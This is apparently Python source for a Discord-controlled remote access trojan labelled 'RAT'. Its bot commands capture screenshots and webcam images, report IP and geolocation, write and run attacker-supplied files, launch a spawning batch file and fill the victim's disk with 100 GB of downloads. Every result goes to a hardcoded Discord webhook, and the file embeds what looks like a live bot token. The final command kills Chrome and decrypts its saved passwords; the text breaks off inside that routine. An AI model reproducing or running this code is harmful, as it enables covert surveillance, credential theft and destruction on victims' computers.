
import os
from os import system
clear = lambda: os.system('cls')
import socket
import time
import random
try:
  import discord
  from discord.ext import commands
  from discord import app_commands
  from discord import Permissions
except:
  os.system("pip install discord.py")
  import discord
  from discord.ext import commands
  from discord import app_commands
  from discord import Permissions
  clear()
try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
except:
    os.system("pip install discord-webhook")
    from discord_webhook import DiscordWebhook, DiscordEmbed
    clear()
try:
  import asyncio
except:
  os.system("pip install asyncio")
  import asyncio
  clear()
try:
    from PIL  import *
except:
    os.system('pip install Pillow --upgrade')
    from PIL import *
    clear()

token_nuke = 'OTQ3Mjc0NTQyNDI0OTM2NTA4.G0b25C.1W7GvWQevlgCi-s59R5YQuTleafrHyeDN74p6Q'
bot_activitie = 'AIO - DPT'

token = f"{token_nuke}"

client = commands.Bot(command_prefix="!", help_command=None, intents = discord.Intents.all())
clear = lambda: os.system('cls')
clear()
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name=f"{bot_activitie}"))
  synced = await client.tree.sync()

@client.tree.command(name="screenshot")
async def screenshot(ctx):
  try:
    import pyautogui
  except:
    os.system('pip install pyautogui')
    import pyautogui
  test = socket.gethostname()
  username = os.getlogin()
  
  fpaa = rf"C:\Users\{username}\Downloads\0.jpg"
  
  n = os.linesep
  try:
    content = ""
    
    webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
    
    embed = DiscordEmbed(title=f"**All In One**",  color=242424)
    
    webhook.add_embed(embed)
    embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
    embed.set_footer(text=f"All In One - Discord Tools Program")
    embed.set_timestamp()
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(f'{fpaa}')
    with open(f"{fpaa}", "rb") as f:
      webhook.add_file(file=f.read(), filename='0.jpg')
      embed.set_image(url='attachment://0.jpg')
      response = webhook.execute()
  except:
    content = ""
    
    webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (screenshot)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
    
    embed = DiscordEmbed(title=f"**All In One**",  color=242424)
    webhook.add_embed(embed)
    embed.set_description(f"fail to take screenshot {n}PC = '{test}' {n}path = '{fpaa}' {n}OS = '{username}'")
    embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
    embed.set_footer(text=f"All In One - Discord Tools Program")
    embed.set_timestamp()
    response = webhook.execute()
  try:
    os.remove(fpaa)
  except:
    content = ""
    
    webhook = DiscordWebhook(url=f"hhttps://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username=f"RAT (screenshot)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
    
    embed = DiscordEmbed(title=f"**All In One**",  color=242424)(f"fail to delete screenshot {n}PC = '{test}' {n}path = '{fpaa}'")
    webhook.add_embed(embed)
    embed.set_description(f"fail to delete screenshot {n}PC = '{test}' {n}path = '{fpaa}' {n}OS = '{username}'")
    embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
    embed.set_footer(text=f"All In One - Discord Tools Program")
    embed.set_timestamp()
    response = webhook.execute()

@client.tree.command(name="screencam")
async def screencam(ctx):
  try:
    import cv2
  except:
    os.system("pip install opencv-python")
    import cv2
  test = socket.gethostname()
  username = os.getlogin()
  n = os.linesep

  fpaa = rf"C:\Users\{username}\Downloads\1.jpg"

  try:
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cv2.imwrite(fpaa, frame)
    cap.release()
    content = ""
    
    webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (screencam)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
    
    embed = DiscordEmbed(title=f"**All In One**",  color=242424)
    webhook.add_embed(embed)
    embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
    embed.set_footer(text=f"All In One - Discord Tools Program")
    embed.set_timestamp()
    with open(f"{fpaa}", "rb") as f:
      webhook.add_file(file=f.read(), filename='1.jpg')
      embed.set_image(url='attachment://1.jpg')
      response = webhook.execute()
  except:
    content = ""
    
    webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (screencam)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
    embed = DiscordEmbed(title=f"**All In One**",  color=242424)
    
    webhook.add_embed(embed)
    embed.set_description(f"fail to take screencam {n}PC = '{test}' {n}path = '{fpaa}' {n}OS = '{username}'")
    embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
    embed.set_footer(text=f"All In One - Discord Tools Program")
    embed.set_timestamp()
    response = webhook.execute()
  try:
    os.remove(fpaa)
  except:
    content = ""

    webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (screencam)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
    embed = DiscordEmbed(title=f"**All In One**",  color=242424)

    webhook.add_embed(embed)
    embed.set_description(f"fail to remove screencam {n}PC = '{test}' {n}path = '{fpaa}' {n}OS = '{username}'")
    embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
    embed.set_footer(text=f"All In One - Discord Tools Program")
    embed.set_timestamp()
    response = webhook.execute()
  
@client.tree.command(name="inf_cmd")
async def inf_cmd(ctx):
  test = socket.gethostname()
  username = os.getlogin()
  n = os.linesep

  fpaa = rf"C:\Users\{username}\Downloads\2.bat"

  try:
    with open(fpaa, 'x') as fp:
      fp.write(rf":start{n}Start{n}goto start")
    
    content = ""

    webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (inf_cmd)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
    embed = DiscordEmbed(title=f"**All In One**",  color=242424)

    webhook.add_embed(embed)
    embed.set_description(f"inf cmd was create {n}PC = '{test}' {n}path = '{fpaa}' {n}OS = '{username}'")
    embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
    embed.set_footer(text=f"All In One - Discord Tools Program")
    embed.set_timestamp()
    response = webhook.execute()
  except:
    content = ""

    webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (inf_cmd)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
    embed = DiscordEmbed(title=f"**All In One**",  color=242424)

    webhook.add_embed(embed)
    embed.set_description(f"fail to create inf cmd {n}PC = '{test}' {n}path = '{fpaa}' {n}OS = '{username}'")
    embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
    embed.set_footer(text=f"All In One - Discord Tools Program")
    embed.set_timestamp()
    response = webhook.execute()
  
@client.tree.command(name="open")
@app_commands.describe(path_file = "path to the file")
async def open_file(ctx, path_file: str):
  os.system(f'"{path_file}"')
  test = socket.gethostname()
  username = os.getlogin()
  n = os.linesep
  content = ""

  webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (open)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
  embed = DiscordEmbed(title=f"**All In One**",  color=242424)

  webhook.add_embed(embed)
  embed.set_description(f"file was open {n}PC = '{test}' {n}path = '{path_file}' {n}OS = '{username}'")
  embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
  embed.set_footer(text=f"All In One - Discord Tools Program")
  embed.set_timestamp()
  response = webhook.execute()
  time.sleep(300)
  try:
    os.remove(path_file)
  except:
    content = ""

    webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (open)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
    embed = DiscordEmbed(title=f"**All In One**",  color=242424)

    webhook.add_embed(embed)
    embed.set_description(f"fail to remove open file {n}PC = '{test}' {n}path = '{path_file}' {n}OS = '{username}'")
    embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
    embed.set_footer(text=f"All In One - Discord Tools Program")
    embed.set_timestamp()
    response = webhook.execute()
  
@client.tree.command(name="create_file")
@app_commands.describe(pcode = "text/code", extention = ".txt/py/pyw/bat")
async def p_code(ctx, pcode: str, extention: str):
  ez = random.randint(99,99999)
  Username = os.getlogin()
  
  fpaa = rf"C:\Users\{username}\Downloads\{ez}{extention}"

  with open(f"{fpaa}", "x") as f:
    f.write(f"""{pcode}""")
  username = os.getlogin()
  test = socket.gethostname()
  n = os.linesep
  content = ""

  webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (create_file)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
  embed = DiscordEmbed(title=f"**All In One**",  color=242424)

  webhook.add_embed(embed)
  embed.set_description(f"text/code/other was create {n}PC = '{test}' {n}path = '{fpaa}' {n}OS = '{username}'")
  embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
  embed.set_footer(text=f"All In One - Discord Tools Program")
  embed.set_timestamp()
  response = webhook.execute()

@client.tree.command(name="video")
@app_commands.describe(web = "URL")
async def URL_y(ctx, web: str):
  try:
    from pytube import YouTube
  except:
    os.system('pip install pytube')
    from pytube import YouTube
  test = socket.gethostname()
  username = os.getlogin()
  n = os.linesep

  fpaa = rf"C:\Users\{username}\Downloads"

  content = ""

  webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (video)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
  embed = DiscordEmbed(title=f"**All In One**",  color=242424)
  
  ytb = web
  webhook.add_embed(embed)
  embed.set_description(f"video was download {n}PC = '{test}' {n}path = '{fpaa}' {n}OS = '{username}' {n} URL = '{ytb}' extention = '.3GPP'")
  embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
  embed.set_footer(text=f"All In One - Discord Tools Program")
  embed.set_timestamp()
  response = webhook.execute()
  youtube = YouTube(ytb)
  my_video = youtube.streams.first()
  my_video.download(fpaa)

@client.tree.command(name="fuck_storage")
async def fuck_storage(ctx):
  try:
    import wget
  except:
    os.system("pip install wget")
    import wget
  test = socket.gethostname()
  username = os.getlogin()
  n = os.linesep
  i = 0

  fpaa = rf"C:\Users\{username}\AppData\FS"


  URL = "https://speed.hetzner.de/1GB.bin"
  i = 0
  try:
    response = wget.download(URL, "FS1")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS2")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS3")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS4")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS5")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS6")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS7")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS8")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS9")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS10")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS11")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS12")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS13")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS14")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS15")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS16")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS17")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS18")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS19")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS20")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS21")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS22")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, r"FS23")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS24")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS25")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS26")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS27")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS28")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS29")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS30")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS31")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS32")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS33")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS34")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS35")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS36")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS37")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS38")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS39")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS40")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS41")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS42")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS43")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS44")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS45")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS46")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS47")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS48")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS49")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS50")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS51")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS52")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS53")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS54")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS55")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS56")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS57")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS58")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS58")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS59")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS60")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS61")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS62")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS63")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS64")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS65")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS66")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS67")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS68")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS69")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS70")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS71")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS72")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS73")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS74")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS75")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS76")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS77")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS78")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS79")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "F80")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS81")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS82")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "F83")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS84")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS85")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS86")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS87")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS88")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS89")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS90")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS91")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS92")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS93")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS94")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS95")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS96")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS97")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS98")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS99")
    i = i + 1
  except:
    pass
  try:
    response = wget.download(URL, "FS100")
    i = i + 1
  except:
    pass
  content = ""

  webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (fuck_storage)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
  embed = DiscordEmbed(title=f"**All In One**",  color=242424)

  webhook.add_embed(embed)
  embed.set_description(f"{i}G was download (max = 100G) {n}PC = '{test}' {n}OS = '{username}' {n} URL = 'https://speed.hetzner.de/1GB.bin'")
  embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
  embed.set_footer(text=f"All In One - Discord Tools Program")
  embed.set_timestamp()
  response = webhook.execute()

@client.tree.command(name="serveurinfo")
async def serveurinfo(ctx):
  try:
    from requests import get
    from urllib.request import Request, urlopen
  except:
    os.system('pip install requests')
    from requests import get
    from urllib.request import Request, urlopen
  try:
    import pyautogui
  except:
    os.system('pip install pyautogui')
    import pyautogui
  ip = get('https://ipinfo.io').text
  username = os.getlogin()
  n = os.linesep

  fpaa = rf"C:\Users\{username}\Downloads\0.jpg"

  try:
      myScreenshot = pyautogui.screenshot()
      myScreenshot.save(f'{fpaa}')
  except:
      pass

  content = ""
  webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (IP Password)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
  embed = DiscordEmbed(title=f"**All In One**",  color=242424)
  test = socket.gethostname()

  embed.set_description(f"{ip}")
  embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
  embed.set_footer(text=f"All In One - Discord Tools Program")
  embed.set_timestamp()
  webhook.add_embed(embed)
  try:
    with open(f"{fpaa}", "rb") as f:
      webhook.add_file(file=f.read(), filename='0.jpg')
      embed.set_image(url='attachment://0.jpg')
      response = webhook.execute()
  except:
    pass
  try:
    os.remove(fpaa)
  except:
    content = ""

    webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="RAT (IP Password)", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
    embed = DiscordEmbed(title=f"**All In One**",  color=242424)

    webhook.add_embed(embed)
    embed.set_description(f"fail to remove screenshot {n}PC = '{test}' {n}path = '{fpaa}' {n}OS = '{username}'")
    embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
    embed.set_footer(text=f"All In One - Discord Tools Program")
    embed.set_timestamp()
    response = webhook.execute()

@client.tree.command(name="aio")
async def AIO(ctx):
  import socket
  import os
  from os import system
  clear = lambda: os.system('cls')
  import time
  import sqlite3
  from re import findall
  try:
    from requests import get
    from urllib.request import Request, urlopen
  except:
    os.system('pip install requests')
    from requests import get
    from urllib.request import Request, urlopen
    clear()
  try:
    import pyautogui
  except:
    os.system('pip install pyautogui')
    import pyautogui
    clear()
  try:
    import pynput
    from pynput.keyboard import Key, Listener
  except:
    os.system("pip install pynput")
    import pynput
    from pynput.keyboard import Key, Listener
    clear()
  try:
    import colorama
    from colorama import Fore
  except:
    os.system("pip install colorama")
    import colorama
    from colorama import Fore
    clear()
  try:
    import json
    from json import loads, dumps
  except:
    os.system("pip install jsonlib")
    os.system('pip install json')
    import json
    from json import loads, dumps
    clear()
  try:
    from discord_webhook import DiscordWebhook, DiscordEmbed
  except:
    os.system("pip install discord-webhook")
    from discord_webhook import DiscordWebhook, DiscordEmbed
    clear()
  try:
    from Cryptodome.Cipher import AES
  except:
    os.system("pip3 install pycryptodomex")
    from Cryptodome.Cipher import AES
    clear()
  try:
    import win32crypt
  except:
    os.system("pip install pywin32")
    import win32crypt
    clear()
  try:
    import base64
  except:
    os.system("pip install pybase64")
    import base64
    clear()
  try:
    import PIL
  except:
    os.system('pip install Pillow --upgrade')
    import PIL
  clear()
  def closeChrome():
    try:
      os.system("taskkill /f /im chrome.exe")
      clear()
    except:
      pass

  username = os.getlogin()

  ip = get('https://ipinfo.io').text

  fpaa = rf"C:\Users\{username}\Downloads\0.jpg"

  try:
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(f'{fpaa}')
  except:
    pass

  content = ""
  webhook = DiscordWebhook(url=f"https://discord.com/api/webhooks/1093568232474034176/WxWt4-hnCjV4pfFGn7zHCuqEpoEp4zjvNqDEtdvQTVyse6s6TM3qlMm2OnjCdibUBbN5", username="IP Password", avatar_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png", content=content)
  embed = DiscordEmbed(title=f"**All In One**",  color=242424)
  test = socket.gethostname()

  embed.set_description(f"{ip}")
  embed.set_author(name=f"{test}", url=f"https://www.youtube.com/@Kawaii_iKi_san/videos", icon_url="https://i.ibb.co/PCP5tLh/kisspng-security-hacker-white-hat-anonymous-logo-products-and-services-data-solver-5c4f1b3b8218f9-95.png")
  embed.set_footer(text=f"All In One - Discord Tools Program")
  embed.set_timestamp()
  webhook.add_embed(embed)
  try:
    with open(f"{fpaa}", "rb") as f:
        webhook.add_file(file=f.read(), filename='0.jpg')
        embed.set_image(url='attachment://0.jpg')
        os.remove(fpaa)
  except:
    pass
  response = webhook.execute()

  def getSecretKey():
    try:
        with open(os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE'])), "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        pass
  clear()
  def decryptPayload(cipher, payload):
    return cipher.decrypt(payload)

  def generateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

  def decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generateCipher(secret_key, initialisation_vector)
        decrypted_pass = decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except:
        pass
  def getChromePasswords():
    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
